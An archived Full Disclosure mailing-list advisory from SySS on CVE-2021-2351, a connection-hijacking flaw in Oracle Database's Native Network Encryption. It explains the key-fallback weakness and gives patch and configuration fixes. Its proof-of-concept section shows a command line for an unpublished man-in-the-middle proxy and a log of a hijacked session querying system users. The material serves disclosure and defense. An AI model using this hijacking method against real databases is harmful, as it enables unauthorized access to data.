<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="[SYSS-2021-061] Oracle Database - NNE Connection Hijacking"/>
<meta name="Author" content="Moritz Bechler"/>
<title>Full Disclosure: [SYSS-2021-061] Oracle Database - NNE Connection Hijacking</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="18"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#19">By Date</a>
<a href="20"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="18"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#19">By Thread</a>
<a href="20"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">[SYSS-2021-061] Oracle Database - NNE Connection Hijacking</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Moritz Bechler &lt;moritz.bechler () syss de&gt;<br>

<em>Date</em>: Fri, 10 Dec 2021 10:18:20 +0100<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">Advisory ID:               SYSS-2021-061 
Product:                   Database
Manufacturer:              Oracle
Affected Version(s):       12.1.0.2, 12.2.0.1, 19c
Tested Version(s):         18c
Vulnerability Type:        Protection Mechanism Failure (CWE-693)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2021-03-17
Solution Date:             2021-08-07
Public Disclosure:         2021-12-10
CVE Reference:             CVE-2021-2351
Author of Advisory:        Moritz Bechler, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

Oracle Database is a general purpose relational database management 
system (RDMBS).

The manufacturer describes the product as follows (see [1]):

&quot;Oracle database products offer customers cost-optimized and high-performance 
versions of Oracle Database, the world&apos;s leading converged, multi-model 
database management system, as well as in-memory, NoSQL and MySQL databases.
Oracle Autonomous Database, available on premises via Oracle Cloud@Customer 
or in the Oracle Cloud Infrastructure, enables customers to simplify relational 
database environments and reduce management workloads.&quot;

To protect the client/server communication, a proprietary security protocol 
&quot;Native Network Encryption&quot; (NNE) is used. 
A TLS-based alternative can optionally be configured.

Due to insecure fallback behavior, a man-in-the-middle attacker can bypass
NNE&apos;s protection against man-in-the-middle attacks and hijack authenticated
connections. In some configurations, a full man-in-the-middle attack is
possible.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

To mitigate against man-in-the-middle attacks on the initial Diffie-
Hellman key exchange, the protocol implements the mixin of an additional
shared key that is established by the authentication protocol 
(typically O5Logon). This relies on the fact that both client and server
have knowledge of the user password (hash), which a potential attacker 
does not have.

For more details on the protocol, refer to our paper [4].

SySS, however, found out that the JDBC Thin client implementation did 
not implement that fold-in and its connections were still accepted 
by database servers. The server performs a fallback to the initial 
session key if the decryption/integrity check fails.

That original key is known to an attacker who has performed a classic
man-in-the-middle attack against the initial Diffie-Hellman key exchange.

For JDBC Thin client, this allows direct observation and manipulation
of the application level traffic, as both parties still use the 
original keys.

Nevertheless, other clients, which implement the authentication key fold-in, 
are still vulnerable. While the client expects a different session key
after authentication has completed, it can simply be dropped/ignored. 
The server side of the connection at this point is already authenticated 
and communication is still possible due to the key fallback. This grants
access to the database system as the original victim user.

This attack is successful in all known configurations, except if TLS
security is used.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

For protocol analysis and attacks, SySS built a proxy server implementing
the database protocol fundamentals and NNE. The proxy can perform a
man-in-the-middle attack against the Diffie-Hellman key exchange during
NNE negotation. Then, the necessary translation and adjustment between
the client and server, which are now using different session keys, is
performed.

Launching the proxy and redirecting a client connection to it, the
man-in-the-middle attack is performed. The encrypted part of the further
protocol negotiation can be observed, including the authentication exchange.
Then, the client is dropped, and the proxy sends a predefined query to the 
server.

The following log excerpt shows an OCI client (21.3) connecting as the
system user. The connection is hijacked and the system user table is
queried by the attack proxy.

</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">./mitm.py --targethost 172.17.0.1 --mitmDH --hijackConnection
</pre></blockquote><pre style="margin: 0em;">[...]
            |###[ Service ]### 
            |  serviceId = encryption
            |  numParameters= 2
            |  unknown1  = 0
            |###[ EncryptionResp ]### 
            |     version   = 12000000
            |     algo      = AES256
            |###[ Service ]### 
            |  serviceId = integrity
            |  numParameters= 8
            |  unknown1  = 0
            |###[ IntegrityResp ]### 
            |     version   = 12000000
            |     algo      = SHA256
            |     len1      = 0800
            |     len2      = 0800
            |     generator = [...]
            |     prime     = [...]
            |     public    = [...]
            |     rand      = 666F6F206261722062617A206261742071757578

[...]
DEBUG:root:Forward server -&gt; client
DEBUG:root:Received encrypted payload [...]
[...]\x0cAUTH_USER_ID\x01\x00\x00\x00\x019\x00\x00\x00\x00\x0f\x00\x00\x00\x0fAUTH_SESSION_ID[...]
[authentication completed at this point]
INFO:root:Initially hijacking connection
[...]
DEBUG:root:Received encrypted payload [...]
INFO:root:###[ TTIMsg ]### 
  TTCode    = 8
###[ RPA ]### 
     outNbPairs= None
     \nbPairs   \
      |###[ KVPair ]### 
      |  keyPtr    = None
      |  key       = b&apos;\x00VOracle Database 18c Express Edition Release 18.0.0.0.0 - Production\nVersion 18.4.0.0&apos;
[...]

INFO:root:b&apos;[...]+select DISTINCT username FROM sys.all_users[...]
INFO:root:Send encrypted payload [...] len 368
[...]
DEBUG:root:Received encrypted payload [...]
INFO:root:###[ TTIMsg ]### 
  TTCode    = 6
###[ Raw ]### 
     load      = &apos;[...]\x07\x06DBSNMP\x07\tAPPQOSSYS\x07\nGSMCATUSER\x07\x05GGSYS\x07\x03XDB[...]&apos;

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

Update the Oracle Database servers and clients to the patched versions.
Enforce usage of a secured protocol version by setting the following options:

 SQLNET.ALLOW_WEAK_CRYPTO_CLIENTS=FALSE (server-side)
 SQLNET.ALLOW_WEAK_CRYPTO=FALSE (client-side)


Or use TLS-based transport security instead of Native Network Encryption.


More information:
<a  rel="nofollow" href="https://www.oracle.com/security-alerts/cpujul2021.html">https://www.oracle.com/security-alerts/cpujul2021.html</a>
<a  rel="nofollow" href="https://support.oracle.com/rs?type=doc&amp;id=2791571.1">https://support.oracle.com/rs?type=doc&amp;id=2791571.1</a> (customer account required)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2021-03-02: Vulnerability discovered
2021-03-17: Vulnerability reported to manufacturer
2021-07-20: Initial patch release by manufacturer, 
2021-08-07: Final patches released by manufacturer
2021-12-10: Public disclosure of vulnerability

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for Oracle Database
    <a  rel="nofollow" href="https://www.oracle.com/database/">https://www.oracle.com/database/</a>
[2] SySS Security Advisory SYSS-2021-061 
    <a  rel="nofollow" href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-061.txt">https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-061.txt</a>
[3] SySS Responsible Disclosure Policy
    <a  rel="nofollow" href="https://www.syss.de/en/responsible-disclosure-policy">https://www.syss.de/en/responsible-disclosure-policy</a>
[4] Paper &quot;Oracle Native Network Encryption&quot; 
    <a  rel="nofollow" href="https://www.syss.de/fileadmin/dokumente/Publikationen/2021/2021_Oracle_NNE.pdf">https://www.syss.de/fileadmin/dokumente/Publikationen/2021/2021_Oracle_NNE.pdf</a>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Moritz Bechler of SySS GmbH.

E-Mail: moritz.bechler () syss de
Public Key: <a  rel="nofollow" href="https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Bechler.asc">https://www.syss.de/fileadmin/dokumente/PGPKeys/Moritz_Bechler.asc</a>
Key ID: 0x768EFE2BB3E53DDA
Key Fingerprint: 2C8F F101 9D77 BDE6 465E  CCC2 768E FE2B B3E5 3DDA

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided &quot;as is&quot; 
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: <a  rel="nofollow" href="http://creativecommons.org/licenses/by/3.0/deed.en">http://creativecommons.org/licenses/by/3.0/deed.en</a>

</pre><p><strong>Attachment:
<a href="att-19/OpenPGP_signature.bin" ><tt>OpenPGP_signature</tt></a></strong><br>
<em>Description:</em> OpenPGP digital signature</p>
<pre style="margin: 0em;">

_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="18"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#19">By Date</a>
<a href="20"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="18"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#19">By Thread</a>
<a href="20"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>[SYSS-2021-061] Oracle Database - NNE Connection Hijacking</strong> <em>Moritz Bechler (Dec 10)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

